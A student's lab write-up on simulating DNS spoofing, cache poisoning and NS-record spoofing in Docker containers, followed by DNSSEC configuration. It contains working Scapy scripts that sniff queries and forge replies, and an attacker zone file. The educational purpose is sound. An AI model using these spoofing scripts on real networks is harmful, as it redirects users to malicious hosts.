**DNS Attack Simulation**

## Introduction:
### Purpose:
- To replicate a DNS attack, specifically focusing on DNS Spoofing/Poisoning.
- To propose and configure DNSSEC which aimed at preventing such attacks.
- To conduct a comprehensive analysis of DNS security, addressing issues of spoofing, cache poisoning, and available prevention strategies.

### Problem Statement:
 DNS (Domain Name System) is the Internet’s phone book; it translates hostnames to IP addresses (and vice versa). This translation is through DNS resolution, which happens behind the scene. DNS attacks manipulate this resolution process in various ways, with an intent to misdirect users to alternative destinations, which are often malicious. 

### Overview of tasks:

The objective of this project is to simulate DNS attack such as DNS Spoofing, DNS Cache poisoning and propose some preventions such as DNSSEC. We will simulate the attack and prevention strategy in the following stages:

**Stage 1: Simulate local DNS Attack** 

The main objective of DNS Attack is that it redirects the user who is trying to access a website to an attacker’s malicious website. 

 - Task 1: Directly Spoofing Response to User
 - Task 2: DNS Cache Poisoning Attack
 - Task 3: Spoofing NS Records


**Stage 2: Implement DNSSEC**:

The main objective of this stage is to understand how DNSSEC works and prevents such attacks in the previous stage from happening. Given a simplified DNS infrastructure, we will try to configure each of the nameservers, so they all support DNSSEC.

 - Task 1: Set Up the `example.edu` domain
 - Task 2: Set Up the edu Server
 - Task 3: Set Up the Root Server
 - Task 4: Set Up the Local DNS Server

## Research Summary:
### DNS
The Domain Name System (DNS) is a critical component of the internet infrastructure, responsible for translating human-readable domain names into IP addresses that computers can then use to communicate with each other. The qualities that make DNS vital to the internet also make it a target for threat actors seeking to exploit vulnerabilities for malicious purposes.

DNS attacks attempt to disrupt the functionality of DNS servers as well as the resolution of domain names to IP addresses to redirect users to malicious websites or intercept their internet traffic to gain unauthorized access.

On a global scale,  [88% of organizations have suffered DNS attacks](https://www.efficientip.com/resources/idc-dns-threat-report-2022/)  — with companies encountering an average of seven attacks per year at a cost of $942 thousand per attack, according to the IDC 2022 Global DNS Threat Report. In addition to financial losses, other serious consequences of DNS attacks include data theft, reputation damage, website downtime and malware infections.

### How DNS Attacks Work?

To understand how DNS attacks work, it’s important to first understand how DNS works.

### DNS Mechanics

DNS works by using a hierarchical system of name servers that store information about domain names and their corresponding IP addresses. When a user types a domain name into their browser, the browser sends a DNS query to a local DNS resolver, which then looks up the IP address associated with the domain name. If the DNS resolver doesn't have the IP address, it sends the query to a root DNS server, which directs it to the authoritative DNS server for the domain. The authoritative DNS server then responds to the query with the correct IP address.
**![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeQiCaJK8uumvM9MGxZVjt_IKOe8_ucwUKdsaYdILah3L0e-EsKindCfnmo1ommVHuZrWInFuw9-OLsIxOCrcPE1Uzi7ulX0ZbzlJyCPoOdht1MEG0WSYxjJw4oLJEvwlxizJcOlBCN59pQ40lo7FXzD3sL?key=QmvFcfUl2JclDTvN9GvOXzpB)**
Here's the overview figure of the most popular DNS attacking methods:
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcBK46l04QUP7hG8mZ_LIig4ABJiNmoT1pzCXGqZ-wPwtda3de5MRbl63Ioeh1QpV8jdmG4864Nexmx9ihoIS8aWeG6Tif-KZ-K80vefomLqjYNZQwrE4dXrogBinR7Lu_GMCzRVvSMP7tRAYRgVJFf48TD?key=QmvFcfUl2JclDTvN9GvOXzpB)

(1) Attacks on compromised machines
(2) Spoofing directly to user machine
(3) Cache poisoning attack
(4) Attacks from malicious DNS Server

### DNSSEC
To make sure that the information we get from the Internet is real and safe, we usE DNSSEC (**Domain Name System Security Extensions**). It’s like a security system for the Domain Name System (DNS), which helps translate website names into IP addresses. 

DNSSEC adds extra layers of protection by digitally signing the answers from DNS servers. This means that every time we get an answer, it comes with a special code (the digital signature) that proves it’s authentic. If someone tries to trick us by providing fake information, DNSSEC can catch it because the fake data won’t have a valid signature.

To make this work, DNSSEC uses three types of records: 
1. **RRSIG**: This contains the digital signature for the data.
2. **DNSKEY**: This holds the public key that can verify the signature.
3. **DS**: This tells us that the public key really belongs to the sender by providing a unique code.

When we look up a website, we first check the parent server to ensure everything is secure. This system creates a "chain of trust," ensuring that each part of the information we receive is verified all the way back to the source.

![The Domain Name System: A Cryptographer's Perspective - Verisign Blog](https://blog.verisign.com/wp-content/uploads/FINAL-FIGURE-1-DNSSEC-Chain.png)

### TTL/SSL

Before DNSSEC is commonly used, there are other ways to protect against attacks like DNS cache poisoning. One effective method is the Transport Layer Security (TLS) protocol, which helps keep web and network communications safe.

**How it works?**

After your computer finds the IP address for a website, it doesn’t automatically trust it. Instead, it asks the website owner to prove they own that IP address. For example, when trying to connect to **www.example.net**, your computer first gets the IP address using DNS but then goes a step further.

The website must provide a special document called a public-key certificate, signed by a trusted company (like VeriSign), to prove its identity. This certificate includes details about the website, and the trusted company makes sure it really belongs to the owner.

Only after this verification does your computer trust that the IP address is really linked to **www.example.net**. This security check is part of the TLS protocol, which is often referred to as TLS/SSL because it evolved from an earlier system called Secure Sockets Layer.

## DNS Local Attack Simulation:
### Environment Setup
There are four machines (four Docker containers) representing a user, a local DNS server, an attacker, and an attacker nameserver, all within the same network.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfCaTdPCJAB-WHywIyNqI3tjh06DiK_4fWIL5BEvObsQpFZByECDsoqyUP0Xm5BOJf3WjosYFNjXX-OIDlQxJMba7gCfwxgccu1OI7tnQNPs2iOQaWr5ew6KTtCwk1SbapC1ZsNzm0jJ8L_ZxAlmcjvHNtw?key=QmvFcfUl2JclDTvN9GvOXzpB)

Below are the Docker container IDs for each machine:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe2g0PnmFrBwOt8eGzHLeB5ewvPh-hygu0tVpqy4DME38lH-aR84Kt_gqjVCyiEanyueX0RgvgP1u4tH5VQlyVgjqPncTqKYEwjNuDDMBrAHSfGckKvuyNpCSHi-Gx6ywdGIrUysiiLEAL4HlxaZ3pEy2Us?key=QmvFcfUl2JclDTvN9GvOXzpB)

### Task 1: Directly Spoofing Response to User
#### Overview 
When a user seeks the IP address for `www.example.com`, the query is directed to the local DNS server. Two nameservers are hosting the `example.com` domain: the legitimate nameserver and the attacker’s nameserver. We will query both and analyze the responses.


First, the user machine sends a query to the local DNS server, which then forwards it to the official nameserver for `example.com`.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfFXhFexDJAgpFRIQWstUuA1alDRHpU6mDtEWC2LI8Y2zKer9bGKyGBQ-03k8O6bmHzJTFczh8lPCYj9kIpn_KGS2wCpfj5i3kURmZWDmZFAPyI3usroulB5usJJHtTBVPdRSQygV7oHbmHm3QIKOtwR5N7?key=QmvFcfUl2JclDTvN9GvOXzpB)
<center> Figure 1: Response from local DNS server for DNS Query of www.example.com </center>

You can see that we have received the authoritative answer from `www.example.com`'s nameserver. 

 
Now, instead of querying to the our local DNS server, we can send the query directly to send the query directly to `ns.attacker32.com`

  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXchoJA05tMyVyKWTvbGcUkuPhWoNdApKc2V_bfvRrT4FjxruEB7BZRYkQjGME8m68Cwu7BAKEzcFQJ6Ctw8xBvTsIvbsDE4YiNKhhztv-By-04LjDbIiKAkd4iqRNfRLqie4Mtxhi227AEpvT0N7fO6var0?key=QmvFcfUl2JclDTvN9GvOXzpB)

<center> Figure 2: Response from ns.attacker32.com for DNS Query of www.example.com </center>

Obviously, nobody is going to ask `ns.attacker32.com` for the IP address of `www.example.com` . When the user machine sends out a DNS query to its local DNS server, attacker can immediately send a spoofed reply, using the local DNS server to resolve the IP address of the host name. Attackers can sniff the DNS request message, they can then immediately create a fake DNS response, and send back to the user machine. If the fake reply arrives earlier than the real reply, it will be accepted by the user machine. 

**![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcJWCQ_sJHQ3cVUDjFlUkiHvpZ5X4qPcRvbWvV5hA5x8R8anJHtvtNDJIVO_RJHUa8UAr0_d6Zg4o0toVeTLcCy-8ABwoYzsYMl14a2_4Ph-lC3AMa37sNNsSKMMgXx0qRrdH9cP_g6_Oa5WXJ8ebYvQ9cA?key=QmvFcfUl2JclDTvN9GvOXzpB)**
Namely, if our attack is successful, the first `dig` command should yield a fraudulent result from the attacker rather than the legitimate response.

#### Approach

The essential part of DNS attacks is to be able to forge DNS replies, which are UDP packets. To achieve that, attackers need to know several parameters in the query, including the UDP source port number, the transaction ID of the query, the question in the query, etc. This information can be obtained from the captured query packet. Once attackers get the information, they can construct a DNS reply packet. We will use Python and Scapy to spoof DNS packets.

To achieve this, I will create a program that functions as an attacker DNS server, monitoring traffic for any user attempting to look up `www.example.com` and responding faster than the local DNS server.



```python
#!/usr/bin/env python3

from scapy.all import *
import sys

NS_NAME = "example.com"

def  spoof_dns(pkt):

	if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
		# Create an IP object
		IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) 
		
		# Create a UDP object
		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53) 
		
		# Create an answer record
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.5', ttl=259200) 
		
		# Create an answer record
		NSsec = DNSRR(rrname=NS_NAME, type='NS', rdata='ns.attacker32.com', ttl=259200) 
		
		# Create a DNS object
		DNSpkt = DNS(
					id=pkt[DNS].id,
					aa=1,
					rd=0,
					qdcount=1,
					ancount=1,
					nscount=1,
					qd=pkt[DNS].qd,
					an=Anssec,
					ns=NSsec
		          ) 
		# Assemble the spoofed DNS packet
		spoofpkt = IPpkt / UDPpkt / DNSpkt 
		send(spoofpkt)

	myFilter = "udp port 53"
	pkt = sniff(iface='br-3e931af5a939', filter=myFilter, prn=spoof_dns)
```
  

#### Execution Steps

1.  Identify the network interface for all four machines by opening a terminal and running `ifconfig` to locate the interface associated with the 10.9.0 IP addresses.
 

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcsU4i_5YB5quvTdBaa_zBKqpEjh4uPKbgqRtVImmb0TPetUi8eE1k411k5fSz8xLKatDqzAjMlhsp03L0zY3iQVafOyW6P7HkIbh85tQKIQwGaPFxZcLsP3Rvn6zda7tv1UYlLWAIEXTm_1rKY9G7CXs4?key=QmvFcfUl2JclDTvN9GvOXzpB)

2. Access the local DNS server’s container and flush the cache to ensure it does not hold the IP address of `www.example.com`. This allows the attacker to send a response before the local DNS server does.

> To flush the cache, run  `$ rndc flush`


 3. Execute the script to simulate the attack: `$ sudo python3 spoof_dns.py `

> Keep in mind that if you’re using Windows, executing the script
> without `sudo` will not provide you with the necessary permissions to
> run it. Windows is quite sophisticated and recognizes when an attempt
> is being made to perform potentially harmful actions like "sniffing
> traffic." This is why it’s essential to run the script in WSL (Windows
> Subsystem for Linux) and use `sudo` to grant the required permissions.

 4. In the user machine, run `dig www.example.com`. The expected results should mirror those shown in the previous figures, indicating a successful simulation of the attack.

> The results should look exactly the same as figure 2 meaning that we have successfully simulated the attack!

  #### Key takeaways

 - A solid understanding of DNS packet construction is essential for effective network analysis. Knowing how these packets are structured helps us better interpret the data we capture and troubleshoot any issues that arise.
 - Sniffing the local area network (LAN) is crucial because that's where we can intercept DNS queries made by users to the DNS server. Pick the correct network interface!
 - The workflow of DNS involves first checking the cache for results; if no cached result is found, it queries external DNS servers. Now I can see the importance of flushing the cache before launching the attack!

 #### Challenges
 

 - There are various methods to identify the network interface, but I found that using `ifconfig` is the simplest. However, I have to be sure to update the network interface in your script, as it can vary each time I run `ifconfig`.
 - It’s important to execute commands in the correct container or machine. I accidentally flushed the cache on the user machine, which resulted in a lengthy debugging process ^^

### Task 2: DNS Attack Local Server Cache:

#### Overview

If the attack targets the local DNS server, the damage can last much longer. This is simply because the local DNS server stores DNS results in a cache. If it puts a forged DNS reply in its cache, the cache will be "poisoned" . Therefore, DNS attacks targeting local DNS servers are called DNS cache poisoning attack. Although the damages are different, the technique to attack user machines and local DNS servers are the same, so we will only focus on attacking local DNS servers.

#### Approach
In our attack, we would like to target the queries from the local DNS server (10 . 0 . 2 . 53). In our forged reply, we map the hostname `www.example.net` to IP address `1.2.3.4`, while telling the local DNS server that the nameserver of the `example.net` domain is `ns.attacker32.com.`

I wrote a program to sniff DNS queries sent from the local DNS server (IP: `10.0.2.53`) and respond with a forged packet faster than the legitimate DNS server can. This requires careful packet filtering to ensure that we only act upon the relevant DNS queries.

```python
 #!/usr/bin/env python3
from scapy.all import *
def spoof_dns_replies(pkt):
	if (DNS in pkt and  "example.net"  in pkt[DNS].qd.qname.decode('utf-8')):

		IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Response to the client

		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53) # Standard DNS port

		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.4', ttl=259200) # Spoofed IP

		NSsec = DNSRR(rrname="example.net", type='NS', rdata='ns.attacker32.com', ttl=259200)

		DNSpkt = DNS(
					id=pkt[DNS].id,
					aa=1,
					rd=0,
					qr=1,
					qdcount=1,
					ancount=1,
					nscount=1,
					qd=pkt[DNS].qd,
					an=Anssec,
					ns=NSsec
				)

		spoofpkt = IPpkt / UDPpkt / DNSpkt
		send(spoofpkt)

sniff(iface="br-800b7a6f074a", filter="udp and (src host 10.9.0.53 and dst port 53)", prn=spoof_dns_replies)
```
#### Execution Steps


1.  Identify the network interface for all four machines by opening a terminal and running `ifconfig` to locate the interface associated with the 10.9.0 IP addresses. Paste it back to your iface in the script.
 

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcsU4i_5YB5quvTdBaa_zBKqpEjh4uPKbgqRtVImmb0TPetUi8eE1k411k5fSz8xLKatDqzAjMlhsp03L0zY3iQVafOyW6P7HkIbh85tQKIQwGaPFxZcLsP3Rvn6zda7tv1UYlLWAIEXTm_1rKY9G7CXs4?key=QmvFcfUl2JclDTvN9GvOXzpB)

2. Access the local DNS server’s container and flush the cache to ensure it does not hold the IP address of `www.example.com`. This allows the attacker to send a response before the local DNS server does.

> To flush the cache, run  `$ rndc flush`


 3. Execute the script to simulate the attack: `$ sudo python3 spoof_dns_replies.py `


 4. In the user machine, run `dig www.example.net`. The expected results should mirror those shown in the previous figures, indicating a successful simulation of the attack.
 
5. Check the local DNS cache to confirm that it contains the forged DNS entry

> Inside the local DNS server, run 
	> $ rndc dumpdb -cache  # this command writes the content of the flush into a file call dump.db
	> $ cat /var/cache/bind/dump.db | grep "example.net"

We can see that inside our cache content file, it currently stores the nameserver of `www.example.net` as `ns.attacker32.com` which means our attack has been successfully conducted!

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe2M-T1RMbS5hct6msw1vrfQ0Gij9nGgVrzvo7UMFJyuYfHu7RXzxsCyyJY4AlBvR_ByB5HXI6TMiBGgpVl9TfYnqQuBkzSB8J-qsf0Iyh8rFY0at7h6mqxmaU4itXjrHKwkOtyWS8dcBK_WvHdqRZqcxPs?key=QmvFcfUl2JclDTvN9GvOXzpB)

#### Key takeaways
- The primary challenge was filtering out the correct packet from network traffic and ensuring that the forged response was sent back to the local DNS server before a legitimate response could arrive.
#### Challenges + Debug Process
I struggled significantly with this task because I was uncertain about which parameters to include in my packet filter. Additionally, I had difficulty identifying the correct network interface. Initially, I believed we needed to sniff packets coming from the internet to the local DNS server (the outside network). However, I realized that this approach would prevent our attack server from sending responses back to the local server faster than the legitimate internet server. Eventually, I understood that we needed to sniff the network interface on the internal network instead.

 When I dig the command from user machine, it didn’t even have the answer section 🙁

 
I then debugged the entire process by switching the interface from monitoring the internal network to the external network to gain a better understanding of the situation.

I removed all the filter, and printed out every packets that my tool can sniff:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfXb1nyv14tTSPWNvXH0R5qsgp-D0kH1DTP1yrbA_ZS5STY4J1O0RS0G7yEo30RljLCB0rvuAIsXPw4h474SXRn4vFtC8UJKiTvG3nw0GUcthUwKk3yO9sdPu-7MYj9CDpvydHUPtnd-Fgy6W3NeYOWWaQ?key=QmvFcfUl2JclDTvN9GvOXzpB)  
  
I was surprised to see how the local DNS server queries the internet DNS server for each domain. During this exploration, I realized that my tool might not have returned the correct response for the last packet, specifically the query for `www.example.net`. To investigate further, I examined my local DNS cache.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcx8eVhMAGz-d12mIvwPFyTHEsg8zG1akStPpnzGVPOtTpQaO6YsTw3tXx80EyJBa1PjybYzQcTUbMMBJvXZHvImw1gWMHC0_QvlqVLR-07sonrnWriK8ua4MVXnsoI8D_aWERAtcpzvoUCyaLBdazQaBs?key=QmvFcfUl2JclDTvN9GvOXzpB)  

I noticed that the cache only contained entries for `example.net` and `_.example.net`, along with their corresponding nameserver and IP address. Unfortunately, the issue arose because I neglected to include `www` in my if statement in my script.

I then ran the steps again and confirmed that the cache is successfully poisoned!

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcXY8-dMDI8ySjdmViBg-XQYLoYknAhMqO2bWoyxqPjdlt7FhsANkdcJxO1CGZII3vn8wR6V51QBotM0ZihIzpX0AvrUPXMs3KIaRlkWg7ATZ_XIZNrG0N-ej_SVXDbxS_Cz2yYOSkpSWoKQkQZ9l-P0Xd-?key=QmvFcfUl2JclDTvN9GvOXzpB)

### Task 3: Spoofing NS Records:
#### Overview
In the previous task, our DNS cache poisoning attack targeted only one hostname, `www.example.com`. To affect other hostnames, like `mail.example.com`, we would need to launch the attack again. 

Instead, we can optimize the attack to affect the entire `example.com` domain by utilizing the Authority section in DNS replies. When spoofing a reply, we not only spoof the answer but also add an entry to the Authority section. This causes the local DNS server to cache `ns.attacker32.com` as the nameserver for all future queries in the `example.com` domain. Since we control `ns.attacker32.com`, it can provide forged answers for any queries, with the IP address of this machine set to `10.9.0.153` in our setup.

#### Approach

We first need to set up a `example.net` zone on `ns.attacker32.com`. This way we can provide authoritative answers for any query about the `example.net` zone. We need to put the following information in the `/image_attacker_ns/name.conf` file: 
```
zone "example.net" {
	type master;
	file "/etc/bind/example.net";
};
```
We also need to put the following zone file inside /etc/bind, and then rebuild our docker containers!
```
$TTL 3D
@       IN      SOA   ns.attacker32.com. admin.attacker32.com. (
                2008111001
                8H
                2H
                4W
                1D)

@       IN      NS    ns.attacker32.com.
@       IN      MX    10 mail.example.net.

www             IN    A  1.2.3.4
mail            IN    A  1.2.3.5
*.example.net.  IN    A  1.2.3.6
```

This DNS zone file simply maps:

- `www.example.net` to IP `1.2.3.4`
- `mail.example.net` to IP `1.2.3.5`
- Any subdomain of `example.net` (`*.example.net`) to IP `1.2.3.6`

It also designates `ns.attacker32.com` as the authoritative nameserver and sets `mail.example.net` as the mail server.

Now that we're done with setting up the environment, let's get back to attacking!

I added a spoofed NS record in my attack code, and sniffed the packet that has `example.net` in its query name, instead of `www.example.net` like before - this way we can attack the whole `example.net` domain (e.g `abc.example.net, mail.example.net, etc`)
```python
 #!/usr/bin/env python3
from scapy.all import *
def spoof_dns_replies(pkt):
	if (DNS in pkt and  "example.net"  in pkt[DNS].qd.qname.decode('utf-8')):

		IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Response to the client

		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53) # Standard DNS port

		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.4', ttl=259200) # Spoofed IP

		NSsec = DNSRR(rrname="example.net", type='NS', rdata='ns.attacker32.com', ttl=259200)

		DNSpkt = DNS(
					id=pkt[DNS].id,
					aa=1,
					rd=0,
					qr=1,
					qdcount=1,
					ancount=1,
					nscount=1,
					qd=pkt[DNS].qd,
					an=Anssec,
					ns=NSsec
				)

		spoofpkt = IPpkt / UDPpkt / DNSpkt
		send(spoofpkt)

sniff(iface="br-800b7a6f074a", filter="udp and (src host 10.9.0.53 and dst port 53)", prn=spoof_dns_replies) 
```
#### Execution Steps:

> Step 1 -3 are the same as the above task's steps

4. In the user machine, run `dig www.example.net`. The expected results should mirror those shown in the previous figures, indicating a successful simulation of the attack.

> We can also run `dig abc.example.net` or `dig mail.example.net` or basically anything that has `example.net` domain!


 
5. Check the local DNS cache to confirm that it contains the forged DNS entry

> Inside the local DNS server, run 
	> $ rndc dumpdb -cache  # this command writes the content of the flush into a file call dump.db
	> $ cat /var/cache/bind/dump.db | grep "example.net"

We can see that inside our cache content file, it currently stores the nameserver of all the entry whose domain is `example.net` as `ns.attacker32.com` which means our attack has been successfully conducted!

#### Key Takeaways


We placed `ns.attacker32.com` in the authority section. The victim DNS server has now cached this fake information. When it receives a query for any `example.net` hostname not already cached, it will reach out to `ns.attacker32.com` for answers. However, without its IP address, the DNS server will issue a DNS query to find it. 

In a real attack, attackers would use a real server and domain, but to avoid this expense in our test, we’ll forge the response, telling the DNS server that `ns.attacker32.com` is at `10.9.0.153`. This completes the attack without needing a real domain.

#### Challenges

The bug I encountered in the previous task helped me understand how the tool sniffs the network and what to look for in incoming DNS query packets. This insight made it easier to adjust filters and fields in crafting the DNS reply packet, so I had no challenges in this task! 😊

### Summary

Through these DNS spoofing and poisoning tasks, I learned how to manipulate DNS caching and set up scalable attacks by redirecting subdomains. Debugging network sniffing and filters was a key challenge that deepened my understanding of packet inspection and precise filtering. I really look forward to learning about remote DNS server as well, it gets more interesting when we know that attackers can even attack the DNS server even though they are not able to see the DNS query!

## DNSSEC
### Environment Setup
Here's a simplified DNS setup, including a root server, a top-level domain server for `.edu`, a domain server for `example.edu`, and a local DNS server. Each nameserver is hosted in a separate container, all placed on the same LAN for simplicity.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXc5qh70It70aGa9Kkr7fC0py1yFSphOqv_E1q5JEhC7NJQvppsZnm-NBYCwD8d6AtmFu71nDn_SupExACM-WNLcjPhtMSDNdvjgdAwr7USY7Tf_gHjfJ6uO9faBy7aUf5ZOgHgTKYdSRg8qdNDtUiLn5kXv?key=QmvFcfUl2JclDTvN9GvOXzpB)

We will try to configure each of the nameservers, so they all support DNSSEC!

### Task 1: Set Up the `example.edu` Domain
#### Overview
In this task, we will go to the container folder for the `example.edu` nameserver. This container hosts the `example.edu` domain. We will modify the files inside this folder, so the nameserver can support DNSSEC queries.

#### Approach
We will generate cryptographic keys for the `example.edu` nameserver to implement DNSSEC. This includes:

- Create a Zone Signing Key (ZSK) to sign DNS records and a Key Signing Key (KSK) to sign the ZSK for added security.

- Sign the `example.edu` zone file, generating digital signatures for each DNS record. This will include RRSIG and DNSKEY records to validate responses to DNS queries.

To secure the `example.edu` domain, we generate two key pairs: the Zone Signing Key (ZSK) and the Key Signing Key (KSK). The ZSK signs the zone records, while the KSK signs the ZSK, allowing for easier updates without frequent changes to the parent zone.

- **ZSK**: Used for signing records; can change often for enhanced security.
- **KSK**: Signs the ZSK; typically stronger and less frequently changed, providing stability.

Run these commands to generate the keys:
1. ZSK (1024 bits):  
   `$ dnssec-keygen -a RSASHA256 -b 1024 example.edu`
   
2. KSK (2048 bits):  
   `$ dnssec-keygen -a RSASHA256 -b 2048 -f KSK example.edu` 

The `-f` option for KSK indicates its purpose in the key file.

After you generate those 2 keys, you will see the following files which corresponding to the public and private ZSK and KSK keys:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXedxYR4TmYqq-7VUjIw8kAhap5dTGu_ugLFU-KmHfzJJnduj92fke5nR0yPfXKmVV5vKpyOcC7i6IPvcHB635w588sBlJZSf8dEy56f_Ash26mBrUPQqtYofTcsQQ429l2umNkLnaP9fwoDDhUc6rNe9G9p?key=QmvFcfUl2JclDTvN9GvOXzpB)

Then we will sign the zone file using the following dnssec-signzone command. 
`$ dnssec-signzone -e 20501231000000 -S -o example.edu example.edu.db`

This command signs the `example.edu` zone file (`example.edu.db`) with DNSSEC. It sets an expiration date for the signatures (`-e 20501231000000`), ensuring that DNS data is secure and authentic! The signed zone file will also contain additional DNSSEC records for enhanced security.

Once the zone file is signed, a new zone file ended with .signed will be generated.

Before signing, the DNS zone file would contain the resource records (RRs) without any signatures. After signing the zone file, you will see several new records added, specifically **RRSIG (Resource Record Signature)** records, which contain the digital signatures for each DNS record set (like SOA, NS, A, and DNSKEY).

In short, it helps verify that the DNS data is indeed provided by the authorized party (the domain owner).

This new zone file will be used by our nameserver, so we will modify the named.conf.seedlabs file to tell the nameserver to use this file as its zone file. See the following example: 
```
zone "example.edu" { 
	type master; 
	file "/etc/bind/example.edu.db.signed"; 
};
```
Now we should rebuild and start our docker containers. We then use the following `dig` command for testing, which allows us to query a specific server (`@server`) for a certain type of DNS record for a domain or host name. By including the `+dnssec` flag, we set the DNSSEC OK bit (DO) in the OPT record, requesting the server to return the associated DNSSEC records, such as signatures.

Here’s an example of what the output should look like: (I don't want to show my keys here ^^)
```
; <<>> DiG 9.10.6 <<>> @10.9.0.65 example.edu DNSKEY +dnssec
; (1 server found)
;; global options: +cmd
;; Query time: 25 msec
;; SERVER: 10.9.0.65#53(10.9.0.65)
;; WHEN: Sun Nov 04 12:34:56 UTC 2024
;; MSG SIZE  rcvd: 200

;; ANSWER SECTION:
example.edu.   3600    IN      DNSKEY 257 3 8 AwEAAcG... [public key here]
example.edu.   3600    IN      DNSKEY 256 3 8 AwEAAcG... [public key here]

;; ADDITIONAL SECTION:
example.edu.   3600    IN      RRSIG DNSKEY 8 2 3600 20241104123456 20241104103456 12345 example.edu. [signature here]
```
In this example, you can see two DNSKEY records for `example.edu`, along with an accompanying RRSIG record. The presence of these records indicates that DNSSEC is enabled for the domain, providing assurance about the integrity and authenticity of the DNS information.

### Task 2: Set Up the edu Server

#### Overview
same as the previous task

#### Approach
Generating keys are the same as the previous task

After signing the zone file for example.edu, a DS (Delegation Signer) record is generated for the Key Signing Key (KSK) and is stored in a file named `dsset-example.edu`. The DS record links the parent zone to the DNSKEY record in the sub-delegated zone.

An example of a DS record is as follows:

```
example.edu. IN DS 10246 8 2 563D...(omitted)...1D59D1
					➀        ➁
```

In this record:
- The **key tag** (marked as ➀) is a short numeric identifier for the KSK.
- The **digest** (marked as ➁) is a hash value of the KSK. 

By placing this digest in the parent zone (e.g., the edu zone), we ensure that the integrity of the KSK for the sub-delegated zone can be verified. This is the primary purpose of the DS record!!

Before signing, add the DS record of the sub-delegated zone (`example.edu`) to the edu zone to verify the integrity of its Key Signing Key. I just copied the DS record directly into the edu zone file and it works fine!

We then can build and run all the containers. Then, execute the following command to retrieve different types of records from the edu nameserver:

`$ dig @10.9.0.60 edu DNSKEY +dnssec`

If DNSSEC is supported, we will see related records such as RRSIG (the digital signature for the DNSKEY record)

### Task 3: Set Up the root Server

#### Overview
same as previous task
#### Approach
same as previous task

Note:  I still need to add the edu zone’s DS record to the zone file, before signing the zone.

### Task 4: Set Up the Local DNS Server

When a computer resolves a hostname to an IP address, it queries a local DNS server, which handles the entire DNS resolution process.

In DNSSEC, nameservers provide their public keys (ZSK and KSK) to clients. The authenticity of the KSK is verified using the DS record in the parent zone. The root server, having no parent, uses trust anchors (its public keys) for validation.

To set up the local DNS server with trust anchors and enable DNSSEC validation, add the root server's KSK to `/etc/bind/bind.keys`:

```
trust-anchors {
  . initial-key 257 3 8 "<Root’s Key Signing Key>";
};
```

Also, modify `named.conf.options` to enable DNSSEC:

```plaintext
dnssec-validation auto;
dnssec-enable yes;
```

After starting the local server container, we can run the following command (10.9.0.53 is the local DNS server's IP):

```bash
$ dig @10.9.0.53 www.example.edu +dnssec
```
We should expect to see this output (again I don't want to show my keys ^^)
```
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 37130
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ...
;; ANSWER SECTION:
www.example.edu. 259200 IN A 1.2.3.5
www.example.edu. 259200 IN RRSIG ... <signature>
```

Basically we will receive the authentic IP address for `www.example.edu`. The `ad` flag indicates that the data is authentic, which means that DNSSEC validation has been successful. 

#### Key Takeaways

The key takeaways of this part is that we can actually achieve a very high security prevention from attacks like spoofing and cache poisoning by the effective use of cryptographic keys, digital signatures, and proper configuration of nameservers. How amazing is that!

#### Challenges

I found it sometimes hard to get my head around what actually does behind the scene given that all we needed to do is to configure the correct signed zones. I also struggled a bit with using all of these Linux commands that related to the DNSSEC :( 

### Summary

I learned how to configure a nameserver for DNSSEC by generating ZSK and KSK, signing the zone file, and adding DS records. I also learned how to set up a local DNS server to validate DNSSEC responses using a trust anchor and ensures accurate domain resolution with authenticity checks.

## Reflections
I have learnt a lot about network security than I've ever learnt in any other times at uni. I have always been really interested in computer networks and applications, so seeing the security aspect on top of network is always really interesting.

Even though in network security, there's not actually many lines of codes, but to understand the mechanism behind it is the hardest part! I  am confident enough to say that I have a decent knowledge about DNS Security after I did this project.

There are a lot of challenges around reading the documents, papers and books about network security but I felt like this is gonna be beneficial for me in a lot of aspects of computer science. Understanding network security is crucial in many fields, especially in areas like high-frequency trading, where data integrity and secure communication are very significant. 

 Overall, this experience has not only enhanced my technical knowledge but has also contributed to my professional growth, preparing me for more advanced topics in the field.



## References

- Computer & Internet Security:  A Hands-on Approach
	- Chapter 18 - Domain Name System (DNS) and Attacks 
- DNS Spoofing:
	- https://www.imperva.com/learn/application-security/dns-spoofing/
- What is DNS cache poisoning? | DNS spoofing
	- https://www.cloudflare.com/learning/dns/dns-cache-poisoning/
	
- How does DNSSEC work?
	- https://www.cloudflare.com/en-au/learning/dns/dnssec/how-dnssec-works/

- DNSSEC Overview
	- https://www.youtube.com/watch?v=MrtsKTC3KDM
